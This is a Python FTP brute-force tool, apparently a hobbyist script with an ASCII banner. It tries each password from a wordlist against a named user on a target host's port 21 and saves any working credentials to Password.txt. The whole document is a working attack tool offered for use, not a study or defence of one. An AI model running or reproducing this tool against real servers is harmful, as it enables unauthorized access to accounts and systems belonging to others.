from optparse import OptionParser
import optparse
from colorama import Fore as F , init
import ftplib , os , re
init(autoreset=True)
import socket
import time
import sys
class ftp:
    def __init__(self) -> None:
        self.s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    def main(self):
        parse = OptionParser('''
        
     _____ _____ ____    ____  ____  _   _ _____ _____ ____  
    |  ___|_   _|  _ \  | __ )|  _ \| | | |_   _| ____|  _ \ 
    | |_    | | | |_) | |  _ \| |_) | | | | | | |  _| | |_) |
    |  _|   | | |  __/  | |_) |  _ <| |_| | | | | |___|  _ < 
    |_|     |_| |_|     |____/|_| \_\\___/  |_| |_____|_| \_
                 
                 FTP BRUTER CODED BY Shakun8

    Help : use -h to see the help menu to run the script :)))))                                                       
''')
        parse.add_option('-w','--wordlist',dest='wordlist',help='--wordlist')
        parse.add_option('-t','--target',dest='target',help='--target')
        parse.add_option('-u','--user',dest='user',help='--user')
        parse.add_option('-p' ,'--port',dest='port',help='--port')
        (options ,args) = parse.parse_args()
        if options.wordlist and options.user and options.target != None: 
            self.host = options.target
            self.user = options.user
            self.bruteforce(options.wordlist)
        else : 
            print(parse.usage)
    def bruteforce(self ,passwordlist):
        print('Tring to Connect to Port !!')
        time.sleep(3)
        if self.s.connect_ex((self.host , 21)) == 0 : 
            print('PORT 21 OPEN :)) ')
            time.sleep(1)
            with open(passwordlist,'r') as f : 
                for line in f :
                    line = line.strip()
                    try : 
                        print('Tring with User : {} | Password : {} | Host = {} '.format(self.user , line , self.host))
                        ftp = ftplib.FTP(self.host)
                        ftp.login(self.user,line)
                        print(F.GREEN + 'Login Found as User : {} | Password : {} | Host = {} '.format(self.user , line , self.host))
                        with open('Password.txt','a') as out : 
                            out.write('Login Found as User : {} | Password : {} | Host = {} '.format(self.user , line , self.host))
                        sys.exit()
                    except : 
                        print(F.RED + 'Not Found With User : {} | Password : {} | Host = {} '.format(self.user , line , self.host))
        else : 
            print('WTF ? FTP PORT ISN"T OPEN AND U WANT TO BRUTE IT ???? ')    
            sys.exit()
ftp().main()            







		